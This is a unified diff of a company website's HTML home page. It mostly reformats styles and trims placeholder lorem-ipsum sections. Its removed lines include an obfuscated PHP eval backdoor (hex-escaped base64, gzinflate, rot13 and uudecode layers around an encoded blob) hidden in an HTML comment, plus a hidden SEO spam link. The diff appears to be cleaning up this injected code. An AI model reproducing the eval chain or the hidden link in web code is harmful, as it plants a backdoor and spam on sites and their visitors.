@@ -13,22 +13,22 @@
     <!-- google font -->
     <link href="themes/ssg/assets/css/google-fonts.css" rel="stylesheet">
     <!-- Fontawesome  -->
-    
     <link href="themes/ssg/assets/css/fontawesome/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
     <!-- Bootstrap CSS -->
     <link href="themes/ssg/assets/css/bootstrap.min.css" rel="stylesheet">
     <link href="themes/ssg/assets/css/bootstrap-touch-slider.css" rel="stylesheet">
-     <link href="themes/ssg/assets/css/jquery.fancybox.min.css" rel="stylesheet">
-
+    <link href="themes/ssg/assets/css/jquery.fancybox.min.css" rel="stylesheet">
     <link rel="stylesheet" href="themes/ssg/assets/css/animate.min.css" media="all">
     <link href="themes/ssg/assets/css/aos.css" rel="stylesheet">
-
     <link href="themes/ssg/assets/css/main.css" rel="stylesheet">
+    <!-- REVOLUTION STYLE SHEETS -->
+    <link rel="stylesheet" type="text/css" href="themes/ssg/assets/slider-assets/css/settings.css" />
     
-    
-            
-    <script type="text/javascript" src="themes/ssg/assets/javascript/jquery-3.4.1.min.js" ></script>
-    <script type="text/javascript" src="themes/ssg/assets/javascript/popper.min.js" ></script>
+
+
+    <script type="text/javascript" src="themes/ssg/assets/javascript/jquery-3.4.1.min.js"></script>
+    <script type="text/javascript" src="themes/ssg/assets/javascript/popper.min.js"></script>
     <script type="text/javascript" src="themes/ssg/assets/javascript/bootstrap.min.js"></script>
     <script type="text/javascript" src="themes/ssg/assets/javascript/jquery.touchSwipe.min.js"></script>
     <script type="text/javascript" src="themes/ssg/assets/javascript/TweenMax.min.js"></script>
@@ -38,1077 +38,981 @@
     <script type="text/javascript" src="themes/ssg/assets/javascript/jquery.countup.min.js"></script>
     <script type="text/javascript" src="themes/ssg/assets/javascript/aos.js"></script>
     <script type="text/javascript" src="themes/ssg/assets/javascript/jquery.fancybox.min.js"></script>
-    
-    
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-    <!-- <?php session_start(); error_reporting(0); eval("\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x73\x74\x72\x5f\x72\x6f\x74\x31\x33\x28\x63\x6f\x6e\x76\x65\x72\x74\x5f\x75\x75\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x28'DcHpgkJAAADg/96iwdbkSBKDQcs4agxCuY/3f4rd72M6PAA7O1WCbGxaPR/M7qWGAJHtiMR7Blxhb5HA04e2NS1/ez6/uex3+VSs08fj2PjQveoY30lj0IRcV6ONM9QuvHqZ9GTdQ1MUZUUpqCw0seJatZgv+fjtBKOVVI6VgZ44OUELTsr4bSGBRsYZBZgVPG4GJUvru3JaohQSEybmY4jickyX+coDH3CsqkcJX01nhFJ9VR3Mo1M0y/4G4V3xk4QJj5SFH9S0YF+N9dDwdlVHeX/8djjgWHDZ6+YNZIQ1NbqV/KipUx7qb4r9VdbCevdgthO5XW6m+5G6cvKWVLcWXVKBzzEHA889Yemnp4oTTDeb4lyi2ixHYbyJr8HJ3a6x4KP5DZDJWs0ckK18Lr8viEKOFftsD+4zBvkLZYHx1LV3H/nQArwnzq+obBVCKuvszXQvzqRh8q1O7yyKh4KJnNltQszgHBC773v9SjuoKnSzZlJN6/6P27k/'\x29\x29\x29\x29\x29\x29\x29\x29\x3b\x3f\x3e"); ?> -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PLVKS5EMLH"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-    
-      gtag('config', 'G-PLVKS5EMLH');
-    </script>
-    <style> 
 
+
+    <style>
         #popMakerMyImg {
-          border-radius: 5px;
-          cursor: pointer;
-          transition: 0.3s;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
         }
-        
-        #popMakerMyImg:hover {opacity: 0.7;}
-        
-        /* The Modal (background) */
+
+        #popMakerMyImg:hover {
+            opacity: 0.7;
+        }
+
+        /*===popup modal===*/
         .popupModal {
-          display: none; /* Hidden by default */
-          position: fixed; /* Stay in place */
-          z-index: 9999; /* Sit on top */
-          padding-top: 100px; /* Location of the box */
-          left: 0;
-          top: 0;
-          width: 100%; /* Full width */
-          height: 100%; /* Full height */
-          overflow: auto; /* Enable scroll if needed */
-          background-color: rgb(0,0,0); /* Fallback color */
-          background-color: rgba(0,0,0,0.7); /* Black w/ opacity (0.7) */
+            display: none;
+            position: fixed;
+            z-index: 9999;
+            padding-top: 100px;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgb(0, 0, 0);
+            background-color: rgba(0, 0, 0, 0.7);
         }
-        
-        /* Modal Content (image) */
+
+        /*===popup image===*/
         .popupModal-content {
-          margin: auto;
-          display: block;
-          width: 80%;
-          max-width: 80%; /* Updated to 80% width */
-          height: auto; /* Auto height */
+            margin: auto;
+            display: block;
+            width: 80%;
+            max-width: 80%;
+            /* Updated to 80% width */
+            height: auto;
+            /* Auto height */
         }
-        
-        /* Add Animation */
-        .popupModal-content {  
-          -webkit-animation-name: zoom;
-          -webkit-animation-duration: 0.6s;
-          animation-name: zoom;
-          animation-duration: 0.6s;
+
+        /*===popup animation===*/
+        .popupModal-content {
+            -webkit-animation-name: zoom;
+            -webkit-animation-duration: 0.6s;
+            animation-name: zoom;
+            animation-duration: 0.6s;
         }
-        
+
         @-webkit-keyframes zoom {
-          from {-webkit-transform:scale(0)} 
-          to {-webkit-transform:scale(1)}
+            from {
+                -webkit-transform: scale(0)
+            }
+
+            to {
+                -webkit-transform: scale(1)
+            }
         }
-        
+
         @keyframes zoom {
-          from {transform:scale(0)} 
-          to {transform:scale(1)}
+            from {
+                transform: scale(0)
+            }
+
+            to {
+                transform: scale(1)
+            }
         }
-        
-        /* The Close Button */
+
+        /*===popup close button===*/
         .close {
-          position: absolute;
-          top: 15px;
-          right: 35px;
-          color: #f1f1f1;
-          font-size: 40px;
-          font-weight: bold;
-          transition: 0.3s;
+            position: absolute;
+            top: 15px;
+            right: 35px;
+            color: #f1f1f1;
+            font-size: 40px;
+            font-weight: bold;
+            transition: 0.3s;
         }
-        
+
         .close:hover,
         .close:focus {
-          color: #bbb;
-          text-decoration: none;
-          cursor: pointer;
+            color: #bbb;
+            text-decoration: none;
+            cursor: pointer;
         }
-        
+
         /* 100% Image Width on Smaller Screens */
-        @media only screen and (max-width: 700px){
-          .popupModal-content {
-            width: 100%;
-          }
+        @media only screen and (max-width: 700px) {
+            .popupModal-content {
+                width: 100%;
+            }
         }
-        </style>
-    <!-- End Google Analytics -->
+    </style>
+    <!-- REVOLUTION LAYERS STYLES -->
+    <style type="text/css">
+        #rev_slider_1_1 .uranus.tparrows {
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0);
+        }
+
+        #rev_slider_1_1 .uranus.tparrows:before {
+            width: 50px;
+            height: 50px;
+            line-height: 50px;
+            font-size: 40px;
+            transition: all 0.3s;
+            -webkit-transition: all 0.3s;
+        }
+
+        #rev_slider_1_1 .uranus.tparrows:hover:before {
+            opacity: 0.75;
+        }
+    </style>
 </head>
 
 <body>
     <div id="pagewrap" class="home">
-    <!-- Header fixed-top-->
-    <section id="header" class="masthead " >
-        <div class="topbar" >
-    <div class="container">
-        <div class="row topbarheight align-items-center">
-            <div class="col">
-                <span><a href="tel:+8809610774774"
-                    ><img src="themes/ssg/assets/images/icons/tell.png" alt="" /> +8801607249358</a
-                  ></span
-                >
-              </div>
-              <div class="col text-right">
-                <form class="search-bar-top" style="display: inline;">
-                      <span id="search-icon" class="search-icon-top">
-                      <i class="fas fa-search" data-fancybox data-animation-duration="700" data-src="#g-search" href="javascript:;" class="card-img-top award"></i>
-                      </span>
-                <!--<input class="search-input" type="text" name="search" placeholder="Search..."> -->
-                
-                </form>
-                <span id="social-icons">
-                  <a target="_new" class="facebook" href=""
-                    ><img src="themes/ssg/assets/images/icons/fb.png" alt=""
-                  /></a>
-                  <a  target="_new" class="youtube" href="">
-                  <img src="storage/app/media/icons/youtube-icon.png" alt=""/></a>
-
-                  <a target="_new" class="instagram" href=""><img src="https://ssgbd.com/storage/app/media/icons/instagram-icon.png" alt=""/></a>
-                  <a target="_new" class="linkedin" href=""
-                    ><img src="themes/ssg/assets/images/icons/linkedin.png" alt=""
-                  /></a>
-                </span>
-            </div>
-        </div>
-    </div>
-</div>
-<div class="headerbar">
-    <div class="container">
-            <div class="row">
-                <div class="col " id="menu-column">
-                <nav class="navbar navbar-expand-md bg-white navbar-white-style1 ">
-                <a class="navbar-brand" href="index.html">
-                    <img id="brand-logo" src="./images/promogine.png" />
-                </a>
-                <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
-                    <span class="navbar-toggler-icon">
-                    </span>
-                    <span class="navbar-toggler-icon">
-                    </span>
-                    <span class="navbar-toggler-icon">
-                    </span>
-                </button>
-                <div class="collapse navbar-collapse justify-content-end" id="collapsibleNavbar">
-                    <button class="navbar-toggler close-menu" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
-                    <span class="navbar-toggler-icon">
-                    </span>
-                    <span class="navbar-toggler-icon">
-                    </span>
-                    <span class="navbar-toggler-icon">
-                    </span>
-                    </button>
-                    <ul class="navbar-nav nav ">
-                    <li class="nav-item  active-nav ">
-                        <a class="nav-link" href="index.html">Home
-                        </a>
-                    </li>
-                    <li class="nav-item dropdown  ">
-                        <a id="dropdownAboutUs" href="#" data-toggle="dropdown" class="nav-link dropdown-toggle">
-                            About Us
-                        </a>
-                        <div class="dropdown-menu"  data-aos="fade-up" >
-                        <a class="dropdown-item" href="#"
-                            >Company Overview
-                        </a>
-                        <a class="dropdown-item" href="#"
-                            >Our Management
-                        </a>
-                        </div>
-                    </li>
-                    <li class="nav-item dropdown brandMega ">
-                        <a
-                        id="dropdownBrand"
-                        href="#"
-                        data-toggle="dropdown"
-                        aria-haspopup="true"
-                        aria-expanded="false"
-                        class="nav-link dropdown-toggle"
-                        >Brands
-                        </a>
-                        
-                    </li>
-                    <li class="nav-item dropdown ">
-                        <a
-                        id="dropdownBusinessUnits"
-                        href="#"
-                        data-toggle="dropdown"
-                        class="nav-link dropdown-toggle"
-                        >Business Unit
-                        </a>
-                    </li>
-                    <li class="nav-item dropdown ">
-                        <a
-                        id="dropdownMediaCornar"
-                        href=""
-                        data-toggle="dropdown"
-                        class="nav-link dropdown-toggle"
-                        >Media Corner
-                        </a>
-                        
-                    </li>
-                    <li class="nav-item ">
-                        <a class="nav-link" href="#">Career
-                        </a>
-                    </li>
-                    <li class="nav-item ">
-                        <a class="nav-link" href="#">Contact us
-                        </a>
-                    </li>
-                    </ul>
-                    
-                </div>
-                </nav>       
-            </div>
-        </div>
-    </div>
-</div>
-
-
-<!-- Search Popup-->
-<div style="display: none;" class="g-search" id="g-search">
-<script async src="https://cse.google.com/cse.js?cx=016120151646906232823:nac28eakd8s"></script>
-<div class="gcse-search"></div>
-</div>    </section>
-
-    <!-- Content -->
-    <div style="display:none"><p>Portal Berita Terbaru Wewara <a href='&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#101;&#119;&#97;&#114;&#97;&#46;&#119;&#101;&#98;&#46;&#105;&#100;&#47;' title='Wewara.web.id - Portal Berita Terbaru Wewara' rel='dofollow' target='_blank'>Wewara.web.id - Portal Berita Terbaru Wewara</a></p></div>
-    <section id="layout-content" >
-        <!-- REVOLUTION STYLE SHEETS -->
-<link rel="stylesheet" type="text/css" href="themes/ssg/assets/slider-assets/css/settings.css" />
-<!-- REVOLUTION LAYERS STYLES -->
-<style type="text/css">
-    #rev_slider_1_1 .uranus.tparrows {
-        width: 50px;
-        height: 50px;
-        background: rgba(255, 255, 255, 0);
-    }
-
-    #rev_slider_1_1 .uranus.tparrows:before {
-        width: 50px;
-        height: 50px;
-        line-height: 50px;
-        font-size: 40px;
-        transition: all 0.3s;
-        -webkit-transition: all 0.3s;
-    }
-
-    #rev_slider_1_1 .uranus.tparrows:hover:before {
-        opacity: 0.75;
-    }
-</style>
-
-<div id="rev_slider_1_1_wrapper" class="rev_slider_wrapper fullwidthbanner-container" data-alias="ssg" data-source="gallery" style="margin: 0px auto; background: transparent; padding: 0px; margin-top: 0px; margin-bottom: 0px;">
-    <!-- START REVOLUTION SLIDER 5.4.8.3 auto mode -->
-    <div id="rev_slider_1_1" class="rev_slider fullwidthabanner" style="display: none;" data-version="5.4.8.3">
-        <ul>
-            <!-- SLIDE  START -->
-            <li
-                data-index="rs-1"
-                data-transition="slotzoom-vertical,incube-horizontal,slotzoom-horizontal,boxslide,slideremoveright"
-                data-slotamount="default,default,default,default,default"
-                data-hideafterloop="0"
-                data-hideslideonmobile="off"
-                data-easein="default,default,default,default,default"
-                data-easeout="default,default,default,default,default"
-                data-masterspeed="default,default,default,default,default"
-                data-thumb="assets/001-100x50.jpg"
-                data-rotate="0,0,0,0,0"
-                data-saveperformance="off"
-                data-title="Slide"
-                data-param1=""
-                data-param2=""
-                data-param3=""
-                data-param4=""
-                data-param5=""
-                data-param6=""
-                data-param7=""
-                data-param8=""
-                data-param9=""
-                data-param10=""
-                data-description="">
-                <img
-                    src="./images/1.jpg"
-                    alt=""
-                    title="001"
-                    width="1900"
-                    height="720"
-                    data-bgposition="center center"
-                    data-bgfit="100% 100%"
-                    data-bgrepeat="no-repeat"
-                    class="rev-slidebg"
-                    data-no-retina/>
-                <div
-                    class="tp-caption tp-resizeme"
-                    id="slide-1-layer-2"
-                    data-x="283"
-                    data-y="342"
-                    data-width="['auto']"
-                    data-height="['auto']"
-                    data-type="text"
-                    data-responsive_offset="on"
-                    data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:50px;opacity:0;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
-                    data-textAlign="['inherit','inherit','inherit','inherit']"
-                    data-paddingtop="[0,0,0,0]"
-                    data-paddingright="[0,0,0,0]"
-                    data-paddingbottom="[0,0,0,0]"
-                    data-paddingleft="[0,0,0,0]"
-                    style="z-index: 5; white-space: nowrap; font-size: 60px; line-height: 60px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
-                    MAKING<br />
-                    LIVES BETTER
-                </div>
-                <div
-                    class="tp-caption tp-resizeme"
-                    id="slide-1-layer-3"
-                    data-x="285"
-                    data-y="281"
-                    data-width="['auto']"
-                    data-height="['auto']"
-                    data-type="text"
-                    data-responsive_offset="on"
-                    data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:top;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
-                    data-textAlign="['inherit','inherit','inherit','inherit']"
-                    data-paddingtop="[0,0,0,0]"
-                    data-paddingright="[0,0,0,0]"
-                    data-paddingbottom="[0,0,0,0]"
-                    data-paddingleft="[0,0,0,0]"
-                    style="z-index: 6; white-space: nowrap; font-size: 35px; line-height: 45px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
-                    LITTLE BIT, EVERY DAY
-                </div> 
-            </li> 
-            <!-- SLIDE  END -->
-            <!-- SLIDE  START -->
-            <li
-                data-index="rs-1"
-                data-transition="slotzoom-vertical,incube-horizontal,slotzoom-horizontal,boxslide,slideremoveright"
-                data-slotamount="default,default,default,default,default"
-                data-hideafterloop="0"
-                data-hideslideonmobile="off"
-                data-easein="default,default,default,default,default"
-                data-easeout="default,default,default,default,default"
-                data-masterspeed="default,default,default,default,default"
-                data-thumb="assets/001-100x50.jpg"
-                data-rotate="0,0,0,0,0"
-                data-saveperformance="off"
-                data-title="Slide"
-                data-param1=""
-                data-param2=""
-                data-param3=""
-                data-param4=""
-                data-param5=""
-                data-param6=""
-                data-param7=""
-                data-param8=""
-                data-param9=""
-                data-param10=""
-                data-description="">
-                <img
-                    src="./images/2.jpg"
-                    alt=""
-                    title="001"
-                    width="1900"
-                    height="720"
-                    data-bgposition="center center"
-                    data-bgfit="100% 100%"
-                    data-bgrepeat="no-repeat"
-                    class="rev-slidebg"
-                    data-no-retina/>
-                <div
-                    class="tp-caption tp-resizeme"
-                    id="slide-1-layer-2"
-                    data-x="283"
-                    data-y="342"
-                    data-width="['auto']"
-                    data-height="['auto']"
-                    data-type="text"
-                    data-responsive_offset="on"
-                    data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:50px;opacity:0;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
-                    data-textAlign="['inherit','inherit','inherit','inherit']"
-                    data-paddingtop="[0,0,0,0]"
-                    data-paddingright="[0,0,0,0]"
-                    data-paddingbottom="[0,0,0,0]"
-                    data-paddingleft="[0,0,0,0]"
-                    style="z-index: 5; white-space: nowrap; font-size: 60px; line-height: 60px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
-                    MAKING<br />
-                    LIVES BETTER
-                </div>
-                <div
-                    class="tp-caption tp-resizeme"
-                    id="slide-1-layer-3"
-                    data-x="285"
-                    data-y="281"
-                    data-width="['auto']"
-                    data-height="['auto']"
-                    data-type="text"
-                    data-responsive_offset="on"
-                    data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:top;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
-                    data-textAlign="['inherit','inherit','inherit','inherit']"
-                    data-paddingtop="[0,0,0,0]"
-                    data-paddingright="[0,0,0,0]"
-                    data-paddingbottom="[0,0,0,0]"
-                    data-paddingleft="[0,0,0,0]"
-                    style="z-index: 6; white-space: nowrap; font-size: 35px; line-height: 45px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
-                    LITTLE BIT, EVERY DAY
-                </div> 
-            </li> 
-            <!-- SLIDE  END -->
-            <!-- SLIDE  START -->
-            <li
-                data-index="rs-1"
-                data-transition="slotzoom-vertical,incube-horizontal,slotzoom-horizontal,boxslide,slideremoveright"
-                data-slotamount="default,default,default,default,default"
-                data-hideafterloop="0"
-                data-hideslideonmobile="off"
-                data-easein="default,default,default,default,default"
-                data-easeout="default,default,default,default,default"
-                data-masterspeed="default,default,default,default,default"
-                data-thumb="assets/001-100x50.jpg"
-                data-rotate="0,0,0,0,0"
-                data-saveperformance="off"
-                data-title="Slide"
-                data-param1=""
-                data-param2=""
-                data-param3=""
-                data-param4=""
-                data-param5=""
-                data-param6=""
-                data-param7=""
-                data-param8=""
-                data-param9=""
-                data-param10=""
-                data-description="">
-                <img
-                    src="./images/3.jpg"
-                    alt=""
-                    title="001"
-                    width="1900"
-                    height="720"
-                    data-bgposition="center center"
-                    data-bgfit="100% 100%"
-                    data-bgrepeat="no-repeat"
-                    class="rev-slidebg"
-                    data-no-retina/>
-                <div
-                    class="tp-caption tp-resizeme"
-                    id="slide-1-layer-2"
-                    data-x="283"
-                    data-y="342"
-                    data-width="['auto']"
-                    data-height="['auto']"
-                    data-type="text"
-                    data-responsive_offset="on"
-                    data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:50px;opacity:0;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
-                    data-textAlign="['inherit','inherit','inherit','inherit']"
-                    data-paddingtop="[0,0,0,0]"
-                    data-paddingright="[0,0,0,0]"
-                    data-paddingbottom="[0,0,0,0]"
-                    data-paddingleft="[0,0,0,0]"
-                    style="z-index: 5; white-space: nowrap; font-size: 60px; line-height: 60px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
-                    MAKING<br />
-                    LIVES BETTER
-                </div>
-                <div
-                    class="tp-caption tp-resizeme"
-                    id="slide-1-layer-3"
-                    data-x="285"
-                    data-y="281"
-                    data-width="['auto']"
-                    data-height="['auto']"
-                    data-type="text"
-                    data-responsive_offset="on"
-                    data-frames='[{"delay":0,"speed":300,"frame":"0","from":"y:top;","to":"o:1;","ease":"Power3.easeInOut"},{"delay":"wait","speed":300,"frame":"999","to":"opacity:0;","ease":"Power3.easeInOut"}]'
-                    data-textAlign="['inherit','inherit','inherit','inherit']"
-                    data-paddingtop="[0,0,0,0]"
-                    data-paddingright="[0,0,0,0]"
-                    data-paddingbottom="[0,0,0,0]"
-                    data-paddingleft="[0,0,0,0]"
-                    style="z-index: 6; white-space: nowrap; font-size: 35px; line-height: 45px; font-weight: 400; color: #ffffff; letter-spacing: 0px; font-family: Poppins; display: none;">
-                    LITTLE BIT, EVERY DAY
-                </div> 
-            </li> 
-            <!-- SLIDE  END -->
-        </ul>
-        <div class="tp-bannertimer tp-bottom" style="visibility: hidden !important;"></div>
-    </div>
-</div>
-<!-- <img class="curved-back img-fluid" src="storage/app/media/curved-shape.png" alt="" /> -->
-<!-- END REVOLUTION SLIDER --><!-- main carosoul end  -->
-
-<!-- business unit  -->
-<section id="business-unit" data-aos="fade-up">
-    <div class="container">
-        <div class="row  align-items-center sectionFullHeight">
-            <div class="col">
-                <h2>Business Units</h2>
-                <div id="businessUnitCarousel" class="carousel slide" data-ride="carousel">
-
-                    <!-- The slideshow -->
-                    <div class="carousel-inner">
-                        
-                        <div class="carousel-item active">
-                            <div class="row">
-                                <div class="col-md">
-                                    <img class="slide-item" src="./images/2.jpg" alt="" width="300" />
-                                </div>
-                                <div class="col-md">
-                                    <h3>Lorem Ipsum <br>Lorem ipsum is a doller sit ammet</h3>
-                                    <div class="title text-uppercase">Lorem ipsum is a doller sit ammet</div>
-                                    <p class="short-desc">Lorem ipsum, dolor sit amet consectetur adipisicing elit. Quaerat laudantium corrupti quasi repudiandae, consectetur quis ea laborum nostrum omnis atque, esse qui. Assumenda harum veritatis beatae id. Esse, repudiandae saepe.</p>
-                                    <a class="visit-link" href="#">
-                                        <img src="#" />Know More
-                                    </a>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        
-                        <div class="carousel-item ">
-                            <div class="row">
-                                <div class="col-md">
-                                    <img class="slide-item" src="./images/1.jpg" alt="" width="300" />
-                                </div>
-                                <div class="col-md">
-                                    <h3>Lorem Ipsum <br>Lorem ipsum is a doller sit ammet</h3>
-                                    <div class="title text-uppercase">Lorem ipsum is a doller sit ammet</div>
-                                    <p class="short-desc">Lorem ipsum, dolor sit amet consectetur adipisicing elit. Quaerat laudantium corrupti quasi repudiandae, consectetur quis ea laborum nostrum omnis atque, esse qui. Assumenda harum veritatis beatae id. Esse, repudiandae saepe.</p>
-                                    <a class="visit-link" href="#">
-                                        <img src="#" />Know More
-                                    </a>
-                                </div>
-                            </div>
-                        </div>
-                        
-                    </div>
-
-                    <!-- Left and right controls -->
-                    <a class="carousel-control-prev" href="index.html#businessUnitCarousel">
-                        <span class="carousel-control-prev-icon" ></span>
-                    </a>
-                    <a class="carousel-control-next" href="index.html#businessUnitCarousel">
-                        <span class="carousel-control-next-icon" ></span>
-                    </a>
-                </div>
-            </div>
-        </div>
-    </div>
-</section><!-- end business unit  -->
-<!-- Our products section -->
-<section id="our-brands"  data-aos="fade-up">
-    <div class="container-fluid">
-        <div class="row  align-items-center sectionHalfHeight">
-            <div class="col">
-                <h2>Our Products</h2>
-                <div id="productsCarousel" class="carousel slide" data-ride="carousel">
-                    <!-- The slideshow -->
-                            <div class="carousel-inner">
-                                
-                                <div class="carousel-item active animated zoomIn">
-                                    <div class="row">
-                                        <div class="col-md">
-                                            <img class="img-fluid brand-logo-thumb" src="./images/4.avif" />
-                                            <div class="title">Our flagship brand from the house of Balaji Industries Ltd.</div>
-                                            <p class="short-desc">
-                                                Lorem ipsum dolor sit amet consectetur adipisicing elit. Eos ut.
-                                            </p>
-                                            <a class="visit-link" href="#"><img src="#" alt="" />VISIT SITE
-                                            </a>
-                                        </div>
-
-                                    </div>
-                                </div>
-                                
-                                
-                                <div class="carousel-item  animated zoomIn">
-                                    <div class="row">
-                                        <div class="col-md">
-                                            <img class="img-fluid brand-logo-thumb" src="./images/3.jpg" />
-                                            <div class="title">Our flagship brand from the house of Balaji Industries Ltd.</div>
-                                            <p class="short-desc">
-                                                Lorem ipsum dolor sit amet consectetur adipisicing elit. Eos ut.
-                                            </p>
-                                            <a class="visit-link" href="#"><img src="#" alt="" />VISIT SITE
-                                            </a>
-                                        </div>
-
-                                    </div>
-                                </div>
-                                
-                            </div>
-                    <!-- Left and right controls -->
-                    <a class="carousel-control-prev" href="index.html#productsCarousel">
-                        <span class="carousel-control-prev-icon" ></span>
-                    </a>
-                    <a class="carousel-control-next" href="index.html#productsCarousel">
-                        <span class="carousel-control-next-icon" ></span>
-                    </a>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Our products end  -->
-<!-- Business growth section -->
-<section id="business-growth"  data-aos="fade-up">
-    <div class="container-fluid">
-        <div class="row  align-items-center sectionHalfHeight">
-            <div class="col-12">
+        <!-- Header fixed-top-->
+        <section id="header" class="masthead ">
+            <!----Topbar--->
+            <div class="topbar">
                 <div class="container">
-                    <div class="row mb-4">
-                        <div class="col-md-3 col-sm-6">
-                            <img class="large-icon" src="storage/app/media/icons/years-vector.png" alt="" />
-                            
-                            <div id="years" class="count">50</div>
-                            <div class="year">Years</div>
-                            <div class="short-desc">
-                               Lorem Ipsum is a doller sit ammet
-                            </div>
+                    <div class="row topbarheight align-items-center">
+                        <div class="col">
+                            <span>
+                                <a href="#">
+                                    <img src="themes/ssg/assets/images/icons/tell.png" alt="" /> 
+                                        +8801607249358
+                                </a>
+                            </span>
                         </div>
-                        <div class="col-md-3 col-sm-6">
-                            <img class="large-icon" src="storage/app/media/icons/district-vector.png" alt="" />
-                            <div id="districts" class="count">64</div>
-                            <div class="year">Districts</div>
-                            <div class="short-desc">
-                                Lorem Ipsum is a doller sit ammet
-                            </div>
-                        </div>
-                        <div class="col-md-3 col-sm-6">
-                            <img class="large-icon" src="storage/app/media/icons/familly-vector.png" alt="" />
-                            
-                            <div  id="families"  ><span class="count">100</span>M</div>
-                            <div class="year">Families</div>
-                            <div class="short-desc">
-                                Lorem Ipsum is a doller sit ammet
-                            </div>
-                        </div>
-                        <div class="col-md-3 col-sm-6">
-                            <img class="large-icon" src="storage/app/media/icons/employee-vector.png" alt="" />
-                            
-                            <div  id="employees" ><span class="count">50000</span>+</div>
-                            <div class="year">Employees</div>
-                            <div class="short-desc">
-                                Lorem Ipsum is a doller sit ammet
-                            </div>
+                        <div class="col text-right">
+                            <form class="search-bar-top" style="display: inline;">
+                                <span id="search-icon" class="search-icon-top">
+                                    <i class="fas fa-search" data-fancybox data-animation-duration="700"
+                                        data-src="#g-search" href="javascript:;" class="card-img-top award"></i>
+                                </span>
+                          
+                            </form>
+                            <span id="social-icons">
+                                <a target="_new" class="facebook" href=""><img
+                                        src="themes/ssg/assets/images/icons/fb.png" alt="" /></a>
+                                <a target="_new" class="youtube" href="">
+                                    <img src="storage/app/media/icons/youtube-icon.png" alt="" /></a>
+
+                                <a target="_new" class="instagram" href="">
+                                    <img src="storage/app/media/icons/instagram-icon.png" alt="" /></a>
+                                <a target="_new" class="linkedin" href="">
+                                    <img src="themes/ssg/assets/images/icons/linkedin.png" alt="" /></a>
+                            </span>
                         </div>
                     </div>
                 </div>
             </div>
-   <!--          <div class="col-12">
-       <canvas id="myChart" width="100%" height="35"></canvas>
-   </div> -->
-        </div>
-    </div>
-</section>
-<!-- Business Growth Section End  -->
-<!-- Awards & achivements section -->
-
-<section id="awards-achivement"  data-aos="fade-up">
-    <div class="container">
-        <div class="row  align-items-center sectionFullHeight2">
-            <div class="col-md-5">
-                <h2>Our Achievements</h2>
-                <div class="title">
-                    Achievements that tells our story behind the scene.
-                </div>
-                <div class="short-desc">
-                    <p>
-                        Lorem ipsum dolor sit amet consectetur adipisicing elit. Hic aliquam quidem soluta eius modi quas, quia magni ut earum provident quasi eos enim eaque doloremque pariatur nemo eligendi quos! Deleniti!
-                    </p>
-                </div>
-            </div>
-            <div class="col-md-7">
-                
-                <div id="awardsCarousel" class="carousel slide " data-ride="carousel">
-                    <!-- The slideshow -->
-
-                    <div class="carousel-inner ">
-                        
-                        <div class="carousel-item active ">
-                            <div class="row align-items-center">
-                               
-                                <div class="col achivement-items">
-                                    <div class="row">
-                                        <div class="col-6">
-                                             <img data-fancybox="gallery" data-animation-duration="700" data-src="#AwardISOCertification" href="javascript:;" class="card-img-top award" src="./images/1.jpg" alt="news" />
-
-                                            <div style="display: none;" id="AwardISOCertification">
-
-                                                <div class="row align-items-center sectionHalfHeight  animated fadeInDown">
-                                                    <div class="col-md-4">
-                                                        <img class="img-fluid award-img" src="storage/app/media/awards/award-hi-tech-industries.jpg" alt="news" />
-                                                    </div>
-                                                    <div class="col">
-                                                        <div class="card-block px-2">
-                                                            <h3 class="card-title">
-                                                                    Lorem Ipsum is a doller sit ammet
-                                                                </h3>
-                                                                <p class="card-text">
-                                                                    Lorem ipsum dolor sit amet consectetur adipisicing elit. Quam asperiores ab autem minima pariatur doloremque harum eum nihil quibusdam, excepturi commodi fugiat, est a! Ipsam saepe aut magni eveniet qui.
-                                                                </p>
-                                                        </div>
-
-                                                    </div>
-                                                </div>
-                                            </div>                                        
-                                        </div>
-                                        <div class="col-6">
